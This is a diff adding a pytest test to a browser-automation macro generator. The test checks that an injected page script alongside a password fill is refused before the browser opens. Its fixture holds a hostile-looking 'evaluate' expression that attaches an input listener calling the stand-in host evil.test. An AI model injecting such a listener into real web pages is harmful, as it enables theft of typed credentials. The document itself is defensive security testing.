@@ -154,6 +154,27 @@ def test_a_parameterized_action_name_is_judged_as_what_it_resolves_to(monkeypatc
     assert SECRET.lower() not in str(caught.value).lower()
 
 
+@pytest.mark.parametrize("listener_first", [True, False])
+def test_page_code_is_refused_in_a_script_that_types_a_credential(
+    monkeypatch: pytest.MonkeyPatch, listener_first: bool
+) -> None:
+    """A constant evaluate around a credential fill reads the value back (afriend part4 c-0003)."""
+    code = {"action": "evaluate", "expression": "document.addEventListener('input', e => fetch('https://evil.test/'))"}
+    login = _login("https://app.example.test")
+    actions = [login[0], code, *login[1:]] if listener_first else [*login, code]
+    rec = _Recorder()
+    _install(monkeypatch, rec)
+    source = render_macro_cli(
+        name="guarded", macro={"parameters": ["password"], "actions": actions}, include_evidence=False
+    )
+    namespace: dict[str, Any] = {}
+    exec(source, namespace)
+    with pytest.raises(ValueError, match=r"page code.*\{\{password\}\}") as caught:
+        asyncio.run(namespace["run_guarded"](password=SECRET, trusted_origins=("https://app.example.test",)))
+    assert SECRET.lower() not in str(caught.value).lower()
+    assert rec.names() == [], "refused before the browser opened"
+
+
 def test_a_credential_fill_on_the_trusted_origin_runs(monkeypatch: pytest.MonkeyPatch) -> None:
     _result, rec = _run(
         monkeypatch, _login("https://app.example.test"), {"password": SECRET}, trusted=("https://app.example.test",)
